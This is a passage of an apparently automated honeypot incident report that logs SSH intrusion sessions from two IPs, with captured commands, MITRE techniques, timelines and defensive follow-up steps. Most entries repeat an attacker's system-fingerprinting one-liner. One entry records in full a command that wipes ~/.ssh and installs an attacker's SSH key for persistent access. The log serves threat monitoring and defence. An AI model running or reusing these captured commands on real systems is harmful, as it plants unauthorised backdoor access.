| `2026-09-25 19:05:37` | `cowrie.command.input` |
| `2026-09-25 19:05:38` | `cowrie.log.closed` |
| `2026-09-25 19:05:39` | `cowrie.session.params` |
| `2026-09-25 19:05:39` | `cowrie.command.input` |
| `2026-09-25 19:05:40` | `cowrie.log.closed` |
| `2026-09-25 19:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60b7fc31bb18

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:07 |
| **Last Seen** | 2026-09-25 19:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:07:27` | `cowrie.session.connect` |
| `2026-09-25 19:07:27` | `cowrie.client.version` |
| `2026-09-25 19:07:27` | `cowrie.client.kex` |
| `2026-09-25 19:07:28` | `cowrie.login.success` |
| `2026-09-25 19:07:30` | `cowrie.session.params` |
| `2026-09-25 19:07:30` | `cowrie.command.input` |
| `2026-09-25 19:07:30` | `cowrie.command.input` |
| `2026-09-25 19:07:30` | `cowrie.command.input` |
| `2026-09-25 19:07:30` | `cowrie.command.input` |
| `2026-09-25 19:07:30` | `cowrie.command.input` |
| `2026-09-25 19:07:30` | `cowrie.command.success` |
| `2026-09-25 19:07:30` | `cowrie.command.input` |
| `2026-09-25 19:07:30` | `cowrie.command.input` |
| `2026-09-25 19:07:30` | `cowrie.command.input` |
| `2026-09-25 19:07:30` | `cowrie.command.input` |
| `2026-09-25 19:07:30` | `cowrie.log.closed` |
| `2026-09-25 19:07:31` | `cowrie.session.params` |
| `2026-09-25 19:07:31` | `cowrie.command.input` |
| `2026-09-25 19:07:32` | `cowrie.log.closed` |
| `2026-09-25 19:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72eb36e9de11

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:09 |
| **Last Seen** | 2026-09-25 19:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:09:20` | `cowrie.session.connect` |
| `2026-09-25 19:09:21` | `cowrie.client.version` |
| `2026-09-25 19:09:21` | `cowrie.client.kex` |
| `2026-09-25 19:09:22` | `cowrie.login.success` |
| `2026-09-25 19:09:23` | `cowrie.session.params` |
| `2026-09-25 19:09:23` | `cowrie.command.input` |
| `2026-09-25 19:09:23` | `cowrie.command.input` |
| `2026-09-25 19:09:23` | `cowrie.command.input` |
| `2026-09-25 19:09:23` | `cowrie.command.input` |
| `2026-09-25 19:09:23` | `cowrie.command.input` |
| `2026-09-25 19:09:23` | `cowrie.command.success` |
| `2026-09-25 19:09:23` | `cowrie.command.input` |
| `2026-09-25 19:09:23` | `cowrie.command.input` |
| `2026-09-25 19:09:23` | `cowrie.command.input` |
| `2026-09-25 19:09:23` | `cowrie.command.input` |
| `2026-09-25 19:09:23` | `cowrie.log.closed` |
| `2026-09-25 19:09:24` | `cowrie.session.params` |
| `2026-09-25 19:09:24` | `cowrie.command.input` |
| `2026-09-25 19:09:24` | `cowrie.log.closed` |
| `2026-09-25 19:09:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fb698b15b45

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:11 |
| **Last Seen** | 2026-09-25 19:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:11:17` | `cowrie.session.connect` |
| `2026-09-25 19:11:17` | `cowrie.client.version` |
| `2026-09-25 19:11:17` | `cowrie.client.kex` |
| `2026-09-25 19:11:18` | `cowrie.login.success` |
| `2026-09-25 19:11:20` | `cowrie.session.params` |
| `2026-09-25 19:11:20` | `cowrie.command.input` |
| `2026-09-25 19:11:20` | `cowrie.command.input` |
| `2026-09-25 19:11:20` | `cowrie.command.input` |
| `2026-09-25 19:11:20` | `cowrie.command.input` |
| `2026-09-25 19:11:20` | `cowrie.command.input` |
| `2026-09-25 19:11:20` | `cowrie.command.success` |
| `2026-09-25 19:11:20` | `cowrie.command.input` |
| `2026-09-25 19:11:20` | `cowrie.command.input` |
| `2026-09-25 19:11:20` | `cowrie.command.input` |
| `2026-09-25 19:11:20` | `cowrie.command.input` |
| `2026-09-25 19:11:20` | `cowrie.log.closed` |
| `2026-09-25 19:11:21` | `cowrie.session.params` |
| `2026-09-25 19:11:21` | `cowrie.command.input` |
| `2026-09-25 19:11:22` | `cowrie.log.closed` |
| `2026-09-25 19:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc61599be40c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:13 |
| **Last Seen** | 2026-09-25 19:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:13:20` | `cowrie.session.connect` |
| `2026-09-25 19:13:20` | `cowrie.client.version` |
| `2026-09-25 19:13:20` | `cowrie.client.kex` |
| `2026-09-25 19:13:21` | `cowrie.login.success` |
| `2026-09-25 19:13:22` | `cowrie.session.params` |
| `2026-09-25 19:13:22` | `cowrie.command.input` |
| `2026-09-25 19:13:22` | `cowrie.command.input` |
| `2026-09-25 19:13:22` | `cowrie.command.input` |
| `2026-09-25 19:13:22` | `cowrie.command.input` |
| `2026-09-25 19:13:22` | `cowrie.command.input` |
| `2026-09-25 19:13:22` | `cowrie.command.success` |
| `2026-09-25 19:13:22` | `cowrie.command.input` |
| `2026-09-25 19:13:22` | `cowrie.command.input` |
| `2026-09-25 19:13:22` | `cowrie.command.input` |
| `2026-09-25 19:13:22` | `cowrie.command.input` |
| `2026-09-25 19:13:22` | `cowrie.log.closed` |
| `2026-09-25 19:13:24` | `cowrie.session.params` |
| `2026-09-25 19:13:24` | `cowrie.command.input` |
| `2026-09-25 19:13:24` | `cowrie.log.closed` |
| `2026-09-25 19:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53048c897cc0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:15 |
| **Last Seen** | 2026-09-25 19:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:15:09` | `cowrie.session.connect` |
| `2026-09-25 19:15:09` | `cowrie.client.version` |
| `2026-09-25 19:15:09` | `cowrie.client.kex` |
| `2026-09-25 19:15:11` | `cowrie.login.success` |
| `2026-09-25 19:15:12` | `cowrie.session.params` |
| `2026-09-25 19:15:12` | `cowrie.command.input` |
| `2026-09-25 19:15:12` | `cowrie.command.input` |
| `2026-09-25 19:15:12` | `cowrie.command.input` |
| `2026-09-25 19:15:12` | `cowrie.command.input` |
| `2026-09-25 19:15:12` | `cowrie.command.input` |
| `2026-09-25 19:15:12` | `cowrie.command.success` |
| `2026-09-25 19:15:12` | `cowrie.command.input` |
| `2026-09-25 19:15:12` | `cowrie.command.input` |
| `2026-09-25 19:15:12` | `cowrie.command.input` |
| `2026-09-25 19:15:12` | `cowrie.command.input` |
| `2026-09-25 19:15:13` | `cowrie.log.closed` |
| `2026-09-25 19:15:14` | `cowrie.session.params` |
| `2026-09-25 19:15:14` | `cowrie.command.input` |
| `2026-09-25 19:15:15` | `cowrie.log.closed` |
| `2026-09-25 19:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bcce775915c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:18 |
| **Last Seen** | 2026-09-25 19:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:18:50` | `cowrie.session.connect` |
| `2026-09-25 19:18:50` | `cowrie.client.version` |
| `2026-09-25 19:18:50` | `cowrie.client.kex` |
| `2026-09-25 19:18:52` | `cowrie.login.success` |
| `2026-09-25 19:18:53` | `cowrie.session.params` |
| `2026-09-25 19:18:53` | `cowrie.command.input` |
| `2026-09-25 19:18:53` | `cowrie.command.input` |
| `2026-09-25 19:18:53` | `cowrie.command.input` |
| `2026-09-25 19:18:53` | `cowrie.command.input` |
| `2026-09-25 19:18:53` | `cowrie.command.input` |
| `2026-09-25 19:18:53` | `cowrie.command.success` |
| `2026-09-25 19:18:53` | `cowrie.command.input` |
| `2026-09-25 19:18:53` | `cowrie.command.input` |
| `2026-09-25 19:18:53` | `cowrie.command.input` |
| `2026-09-25 19:18:53` | `cowrie.command.input` |
| `2026-09-25 19:18:54` | `cowrie.log.closed` |
| `2026-09-25 19:18:55` | `cowrie.session.params` |
| `2026-09-25 19:18:55` | `cowrie.command.input` |
| `2026-09-25 19:18:56` | `cowrie.log.closed` |
| `2026-09-25 19:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed9132f62d9c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:20 |
| **Last Seen** | 2026-09-25 19:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:20:45` | `cowrie.session.connect` |
| `2026-09-25 19:20:46` | `cowrie.client.version` |
| `2026-09-25 19:20:46` | `cowrie.client.kex` |
| `2026-09-25 19:20:47` | `cowrie.login.success` |
| `2026-09-25 19:20:48` | `cowrie.session.params` |
| `2026-09-25 19:20:48` | `cowrie.command.input` |
| `2026-09-25 19:20:48` | `cowrie.command.input` |
| `2026-09-25 19:20:48` | `cowrie.command.input` |
| `2026-09-25 19:20:48` | `cowrie.command.input` |
| `2026-09-25 19:20:48` | `cowrie.command.input` |
| `2026-09-25 19:20:48` | `cowrie.command.success` |
| `2026-09-25 19:20:48` | `cowrie.command.input` |
| `2026-09-25 19:20:48` | `cowrie.command.input` |
| `2026-09-25 19:20:48` | `cowrie.command.input` |
| `2026-09-25 19:20:48` | `cowrie.command.input` |
| `2026-09-25 19:20:48` | `cowrie.log.closed` |
| `2026-09-25 19:20:49` | `cowrie.session.params` |
| `2026-09-25 19:20:49` | `cowrie.command.input` |
| `2026-09-25 19:20:50` | `cowrie.log.closed` |
| `2026-09-25 19:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e80ce915202

| Field | Detail |
|---|---|
| **Source IP** | `118.36.136[.]12` |
| **First Seen** | 2026-09-25 19:22 |
| **Last Seen** | 2026-09-25 19:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:22:03` | `cowrie.session.connect` |
| `2026-09-25 19:22:03` | `cowrie.client.version` |
| `2026-09-25 19:22:03` | `cowrie.client.kex` |
| `2026-09-25 19:22:04` | `cowrie.login.success` |
| `2026-09-25 19:22:05` | `cowrie.session.params` |
| `2026-09-25 19:22:05` | `cowrie.command.input` |
| `2026-09-25 19:22:05` | `cowrie.command.failed` |
| `2026-09-25 19:22:05` | `cowrie.log.closed` |
| `2026-09-25 19:22:06` | `cowrie.session.params` |
| `2026-09-25 19:22:06` | `cowrie.command.input` |
| `2026-09-25 19:22:06` | `cowrie.session.file_download` |
| `2026-09-25 19:22:06` | `cowrie.log.closed` |
| `2026-09-25 19:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.36.136[.]12` to AbuseIPDB if not already reported
- [ ] Block `118.36.136[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70e770eb4d8c

| Field | Detail |
|---|---|
| **Source IP** | `118.36.136[.]12` |
| **First Seen** | 2026-09-25 19:22 |
| **Last Seen** | 2026-09-25 19:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:22:06` | `cowrie.session.connect` |
| `2026-09-25 19:22:06` | `cowrie.client.version` |
| `2026-09-25 19:22:07` | `cowrie.client.kex` |
| `2026-09-25 19:22:07` | `cowrie.login.success` |
| `2026-09-25 19:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.36.136[.]12` to AbuseIPDB if not already reported
- [ ] Block `118.36.136[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea489199bede

| Field | Detail |
|---|---|
| **Source IP** | `118.36.136[.]12` |
| **First Seen** | 2026-09-25 19:22 |
| **Last Seen** | 2026-09-25 19:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:22:08` | `cowrie.session.connect` |
| `2026-09-25 19:22:08` | `cowrie.client.version` |
| `2026-09-25 19:22:08` | `cowrie.client.kex` |
| `2026-09-25 19:22:09` | `cowrie.login.success` |
| `2026-09-25 19:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.36.136[.]12` to AbuseIPDB if not already reported
- [ ] Block `118.36.136[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b45ebd6475d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:22 |
| **Last Seen** | 2026-09-25 19:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:22:45` | `cowrie.session.connect` |
| `2026-09-25 19:22:45` | `cowrie.client.version` |
| `2026-09-25 19:22:46` | `cowrie.client.kex` |
| `2026-09-25 19:22:46` | `cowrie.login.success` |
| `2026-09-25 19:22:48` | `cowrie.session.params` |
| `2026-09-25 19:22:48` | `cowrie.command.input` |
| `2026-09-25 19:22:48` | `cowrie.command.input` |
| `2026-09-25 19:22:48` | `cowrie.command.input` |
| `2026-09-25 19:22:48` | `cowrie.command.input` |
| `2026-09-25 19:22:48` | `cowrie.command.input` |
| `2026-09-25 19:22:48` | `cowrie.command.success` |
| `2026-09-25 19:22:48` | `cowrie.command.input` |
| `2026-09-25 19:22:48` | `cowrie.command.input` |
| `2026-09-25 19:22:48` | `cowrie.command.input` |
| `2026-09-25 19:22:48` | `cowrie.command.input` |
| `2026-09-25 19:22:48` | `cowrie.log.closed` |
| `2026-09-25 19:22:49` | `cowrie.session.params` |
| `2026-09-25 19:22:49` | `cowrie.command.input` |
| `2026-09-25 19:22:49` | `cowrie.log.closed` |
| `2026-09-25 19:22:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6720eb224beb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:24 |
| **Last Seen** | 2026-09-25 19:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 19:24:54` | `cowrie.session.connect` |
| `2026-09-25 19:24:54` | `cowrie.client.version` |
| `2026-09-25 19:24:54` | `cowrie.client.kex` |
| `2026-09-25 19:24:55` | `cowrie.login.success` |
| `2026-09-25 19:24:56` | `cowrie.session.params` |
| `2026-09-25 19:24:56` | `cowrie.command.input` |
| `2026-09-25 19:24:56` | `cowrie.command.input` |
| `2026-09-25 19:24:56` | `cowrie.command.input` |
| `2026-09-25 19:24:56` | `cowrie.command.input` |
| `2026-09-25 19:24:56` | `cowrie.command.input` |
| `2026-09-25 19:24:56` | `cowrie.command.success` |
| `2026-09-25 19:24:56` | `cowrie.command.input` |
| `2026-09-25 19:24:56` | `cowrie.command.input` |
| `2026-09-25 19:24:56` | `cowrie.command.input` |
| `2026-09-25 19:24:56` | `cowrie.command.input` |
| `2026-09-25 19:24:57` | `cowrie.log.closed` |
| `2026-09-25 19:24:58` | `cowrie.session.params` |
| `2026-09-25 19:24:58` | `cowrie.command.input` |
| `2026-09-25 19:24:58` | `cowrie.log.closed` |
| `2026-09-25 19:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-447d9876b3ac

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 19:27 |
| **Last Seen** | 2026-09-25 19:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
